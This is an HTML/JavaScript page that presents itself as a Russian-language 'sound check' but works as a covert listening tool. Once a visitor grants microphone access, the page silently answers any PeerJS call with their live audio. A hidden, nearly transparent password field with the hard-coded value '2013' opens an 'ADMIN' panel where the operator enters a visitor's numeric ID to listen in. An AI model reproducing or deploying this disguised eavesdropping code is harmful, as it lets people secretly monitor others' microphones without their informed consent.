<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Service Check</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #0a0a0a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #111; padding: 30px; border-radius: 12px; text-align: center; border: 1px solid #333; width: 300px; }
        button { background: #0070f3; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-bottom: 10px; }
        input { background: #000; border: 1px solid #444; color: #0f0; padding: 10px; width: 85%; margin-top: 10px; text-align: center; font-family: monospace; }
        #display-id { font-size: 32px; color: #0f0; margin: 15px 0; font-family: monospace; display: none; }
        .admin { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; }
    </style>
</head>
<body>

<div class="box">
    <div id="user-side">
        <h3>Проверка звука</h3>
        <button onclick="startClient()">ВКЛЮЧИТЬ ПРОВЕРКУ</button>
        <div id="display-id"></div>
    </div>

    <input type="password" id="p" placeholder="..." oninput="if(this.value=='2013')showAdmin()" style="opacity:0.1; width:30px;">

    <div id="admin-panel" class="admin">
        <h3 style="color:#0f0">ADMIN</h3>
        <input type="number" id="tid" placeholder="Цифровой код">
        <button onclick="connect()" style="background:#222; border:1px solid #0f0; color:#0f0; margin-top:10px;">СЛУШАТЬ</button>
        <div id="stat" style="font-size:12px; margin-top:10px;"></div>
    </div>
</div>

<audio id="audio" autoplay></audio>

<script>
    let peer;
    // Генерируем только цифры (например, от 10000 до 99999)
    const shortId = Math.floor(Math.random() * 90000) + 10000;

    function startClient() {
        // Создаем подключение с цифровым ID
        peer = new Peer(shortId);
        
        peer.on('open', (id) => {
            document.getElementById('display-id').innerText = id;
            document.getElementById('display-id').style.display = 'block';
        });

        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
            peer.on('call', call => {
                call.answer(stream); // Отвечаем мгновенно
            });
        }).catch(e => alert("Доступ запрещен"));
    }

    function showAdmin() {
        document.getElementById('admin-panel').style.display = 'block';
        document.getElementById('p').style.display = 'none';
        if(!peer) peer = new Peer(); // Если зашел сразу как админ
    }

    function connect() {
        const target = document.getElementById('tid').value;
        const s = document.getElementById('stat');
        s.innerText = "Связь...";
        
        const call = peer.call(target, null);
        call.on('stream', remoteStream => {
            s.innerText = "ONLINE";
            s.style.color = "#0f0";
            document.getElementById('audio').srcObject = remoteStream;
        });
        call.on('error', () => { s.innerText = "Ошибка ID"; });
    }
</script>

</body>
</html>
